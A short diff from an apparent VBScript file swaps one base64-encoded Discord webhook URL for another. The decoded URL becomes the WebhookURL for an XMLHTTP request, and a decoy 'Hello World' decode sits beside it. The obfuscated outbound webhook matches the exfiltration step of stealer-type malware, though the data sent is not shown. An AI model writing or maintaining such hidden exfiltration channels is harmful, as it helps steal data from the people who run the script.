@@ -41,7 +41,7 @@ Message = tu
 Dim encodedText, decodedText
 encodedText = "SGVsbG8gV29ybGQ="
 decodedText = Base64Decode(encodedText)
-l8 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA4MDgxMjU0NzcyNjM4MTA2Ni9JczY5UC1ZWkhVV1N3a2QyalRKR2YzS3VXZU9jYU0wN2xaejVfeFI0OVN4S1pFS0w2UmRoRDJqN19ZSm4wNlk2UmRqag=="
+l8 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA4MDgyMTAyNzEzNjg4MDcxMC85am95MFhmdWhsMGR2VlZqVDVxQ0hZLWN0WWxIc2o1ZkcwYWJTRjFEMnRyLXhhampjaS1kNXVRRkdDcWxJaUt0VzBGWA=="
 WebhookURL = l8
 
 Set HttpReq = CreateObject("MSXML2.XMLHTTP")
